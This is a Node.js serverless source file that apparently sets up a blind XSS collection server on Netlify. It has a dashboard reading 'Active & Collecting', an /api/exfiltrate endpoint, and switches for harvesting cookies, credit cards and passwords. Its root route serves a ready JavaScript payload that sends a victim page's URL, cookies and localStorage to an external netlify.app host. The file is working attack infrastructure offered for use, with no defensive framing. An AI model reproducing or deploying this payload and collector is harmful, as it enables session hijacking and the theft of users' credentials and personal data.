const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const serverless = require('serverless-http');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// محتوى لوحة التحكم مدمج بالكامل لضمان العمل 100%
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xless Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #2d2d2d; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { color: #00ffcc; border-bottom: 2px solid #444; padding-bottom: 15px; text-align: center; }
        .status-card { background: #3d3d3d; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #00ffcc; }
        .data-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .data-table th, .data-table td { padding: 12px; text-align: left; border-bottom: 1px solid #444; }
        .data-table th { background-color: #444; color: #00ffcc; }
        .no-data { text-align: center; padding: 40px; color: #888; font-style: italic; }
        .refresh-btn { background: #00ffcc; color: #1a1a1a; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; float: right; transition: 0.3s; }
        .refresh-btn:hover { background: #00ccaa; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="container">
        <button class="refresh-btn" onclick="location.reload()">Refresh Data</button>
        <h1>Xless Control Panel</h1>
        <div class="status-card">
            <h3>System Status: <span style="color: #00ffcc;">Active & Collecting</span></h3>
            <p>Your XSS collection tool is running on Netlify Functions. All captured data will appear below.</p>
        </div>
        <div id="data-container">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Type</th>
                        <th>Data Captured</th>
                        <th>Source URL</th>
                    </tr>
                </thead>
                <tbody id="data-body">
                    <tr>
                        <td colspan="4" class="no-data">Waiting for incoming data... Inject your payload to start collecting.</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
`;

// API Routes
app.post('/api/exfiltrate', (req, res) => {
    console.log('Data received:', req.body);
    res.json({ status: 'success' });
});

app.get('/api/config', (req, res) => {
    res.json({
        collect_cookies: process.env.COLLECT_COOKIES === 'true',
        collect_credit_cards: process.env.COLLECT_CREDIT_CARDS === 'true',
        collect_passwords: process.env.COLLECT_PASSWORDS === 'true'
    });
});

// Dashboard Route
app.get('/dashboard', (req, res) => {
    res.send(dashboardHTML);
});

app.get('/', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    res.send("fetch('https://peaceful-toffee-b5291b.netlify.app/api/exfiltrate', {method:'POST', mode:'no-cors', body:JSON.stringify({url:location.href, cookies:document.cookie, storage:localStorage})});");
});


module.exports.handler = serverless(app);
